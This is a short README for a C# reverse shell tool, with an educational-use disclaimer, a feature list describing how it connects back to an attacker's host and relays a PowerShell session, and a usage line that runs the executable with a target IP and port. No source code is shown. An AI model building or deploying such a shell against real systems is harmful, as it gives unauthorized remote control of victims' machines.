# RShell (C# Reverse Shell)

RShell is a simple reverse shell implementation written in **C#**.  
This project was created **strictly for educational purposes** to demonstrate concepts related to networking, process handling, and inter-process communication in .NET.  

---

## ⚠️ Disclaimer
This tool is intended **only** for:  
- Learning how reverse shells work internally  
- Ethical research and penetration testing in environments you are **authorized** to test  
- Academic or controlled lab demonstrations  

🚫 **Do not use this code for unauthorized access, malicious activity, or in any environment where you don’t have explicit permission.**  
The author is **not responsible** for any misuse of this software.  

---

## ✨ Features
- Written in **C# (.NET)**  
- Connects back to a specified IP and port  
- Redirects input/output between the attacker’s console and the target system’s PowerShell  
- Handles both standard output and error streams  

---

## 🛠️ Usage
1. Compile the project with Visual Studio or `csc` (C# compiler).  
2. Run the executable with the following syntax:  

```bash
RShell.exe <ip> <port>
